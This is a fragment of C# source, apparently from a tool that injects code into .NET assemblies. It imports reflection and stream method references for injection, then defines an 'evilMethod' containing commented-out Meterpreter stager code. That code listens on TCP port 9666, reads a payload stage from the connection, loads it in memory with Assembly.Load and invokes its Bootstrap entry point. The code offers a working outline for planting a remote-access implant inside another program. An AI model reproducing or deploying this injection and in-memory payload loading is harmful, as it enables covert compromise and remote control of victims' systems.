            //mref = m1.Module.Import(typeof(BinaryReader).GetConstructor(
            //    new []{
            //        typeof(MemoryStream)
            //    })
            //);     
            //methodRefs.Add(mref.FullName,mref);       

            //BinaryReader.ReadInt32
            mref = m1.Module.Import(typeof(BinaryReader).GetMethod("ReadInt32"));
            methodRefs.Add(mref.FullName,mref);

            //BinaryReader.ReadBytes
            mref = m1.Module.Import(typeof(BinaryReader).GetMethod("ReadBytes",new []{typeof(int)}));
            methodRefs.Add(mref.FullName,mref);

            //Stream.Seek (BinaryReader.BaseStream.Seek)
            mref = m1.Module.Import(typeof(Stream).GetMethod("Seek",
                new []{
                    typeof(int),
                    typeof(SeekOrigin)
                }
            ));
            methodRefs.Add(mref.FullName,mref);
            
            //MemoryStream Constructor
            mref = m1.Module.Import(typeof(MemoryStream).GetConstructor(
                new[] {
                    typeof(byte[])
                }
            ));
            methodRefs.Add(mref.FullName,mref);

            //Assembly.Load
            mref = m1.Module.Import(typeof(Assembly).GetMethod("Load",new []{typeof(byte[])}));
            methodRefs.Add(mref.FullName,mref);

            //Assembly.GetType
            mref = m1.Module.Import(typeof(Assembly).GetMethod("GetType",new []{typeof(string)}));
            methodRefs.Add(mref.FullName,mref);

            //Type.InvokeMember
            mref = m1.Module.Import(typeof(Type).GetMethod("InvokeMember",
                new[]{
                    typeof(string),
                    typeof(BindingFlags),
                    typeof(Binder),
                    typeof(Object),
                    typeof(Object[])
                }
            ));
            methodRefs.Add(mref.FullName,mref);*/

            return methodRefs;
        }
        private void evilMethod()
        {
            Console.WriteLine("[!!] I am evilMethod starting");
            
            var hello = "hello";

            //Meterpreter testing code taken from 
            //https://github.com/OJ/clr-meterpreter
            /*
            var port = 9666;
            var tcpListener = new TcpListener(System.Net.IPAddress.Any, port);
            tcpListener.Start(1);

            var tcpClient = tcpListener.AcceptTcpClient();
            if (tcpClient != null && tcpClient.Connected)
            {
                tcpListener.Stop();
                using (var s = tcpClient.GetStream())
                using (var r = new BinaryReader(s))
                {
                    var fullStageSize = r.ReadInt32();
                    var fullStage = r.ReadBytes(fullStageSize);
                    
                    #region LoadStage
                    var bytes = fullStage;
                    object client = tcpClient;

                    using (var memStream = new MemoryStream(bytes))
                    using (var memReader = new BinaryReader(memStream))
                    {
                        // skip over the MZ header
                        memReader.ReadBytes(2);
                        // read in the length of metsrv
                        var metSrvSize = memReader.ReadInt32();
                        // Point the reader to the configuration
                        memReader.BaseStream.Seek(metSrvSize, SeekOrigin.Begin);

                        var assembly = Assembly.Load(bytes);
                        var type = assembly.GetType("Met.Core.Server");
                        try
                        {
                            type.InvokeMember("Bootstrap", BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
                                null, null, new object[] { memReader, client });
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.Message);
                            //System.Diagnostics.Debugger.Break();
                        }
                    }
                    #endregion
                }
            }*/        

            //Console.WriteLine("[!!] I am evilMethod ending");
        }
    }
}
